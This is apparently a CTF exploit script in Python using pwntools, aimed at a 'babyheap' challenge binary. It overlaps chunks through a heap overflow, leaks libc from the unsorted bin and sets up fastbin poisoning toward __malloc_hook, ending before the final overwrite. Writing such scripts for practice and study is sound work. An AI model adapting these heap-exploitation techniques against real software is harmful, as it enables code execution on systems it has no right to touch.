#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./babyheap")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./babyheap")
    libc = elf.libc
    main_arena = 0x399b00

else:
    io = remote("localhost", 9999)
    libc = ELF("./libc-2.23.so")

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def New(cont):
    io.sendlineafter(">> ", "1")
    io.sendline(str(len(cont)))
    io.send(cont)

def Edit(idx, cont):
    io.sendlineafter(">> ", "2")
    io.sendline(str(idx))
    io.sendline(str(len(cont)))
    io.send(cont)
    
def Print(idx):
    io.sendlineafter(">> ", "3")
    io.sendline(str(idx))

def Delete(idx):
    io.sendlineafter(">> ", "4")
    io.sendline(str(idx))

if __name__ == "__main__":
    New('0' * 0x10)
    New('1' * 0x10)
    New('2' * 0x100)
    New('3' * 0x10)
    Edit(0, '0' * 0x10 + p64(0) + p64(0x21 + 0x110))
    '''
    +--------+---------+                        +--------+--------+
    |prev0   |size0    |                        |prev0   |size0   |
    +--------+---------+                        +--------+--------+
    |0000000000000000  |                        |0000000000000000 |
    +--------+---------+                        +--------+--------+
    |prev1   |size1    |                        |prev1   |size1+size2|
    +--------+---------+                        +--------+--------+
    |1111111111111111  |                        |1111111111111111 |
    +--------+---------+                        +--------+--------+
    |prev2   |size2    |                        |prev2   |size2   |
    +--------+---------+                        +--------+--------+
    |2222222222222222  |                        |2222222222222222 |
    |                  |                        |2222222222222222 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    |                  |                        |                 |
    +--------+---------+                        +--------+--------+
    |prev3   |size3    |                        |prev3   |size3   |
    +--------+---------+                        +--------+--------+
    |3333333333333333  |                        |333333333333333  |
    +------------------+                        +-----------------+
    '''
    Delete(1)
    #  pause()
    New('1' * 0x10 + p64(0) + p64(0x111) + '2' * 0x100) # must '2' * 0x100?
    #  pause()
    Delete(2)
    #  DEBUG([0xE63], True)
    Print(1)

    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 88 - main_arena
    success("libc.address", libc.address)
    pause()
    
    #  DEBUG([0xCFF, 0xEF2], True)
    New('4' * 0x70)
    New('5' * 0x70)
    Delete(5)

    Edit(4, '4' * 0x70 + p64(0) + p64(0x81) + p64(libc.address + libc.sym['__malloc_hook'] - 0x18 + 5))

    io.interactive()
    io.close()

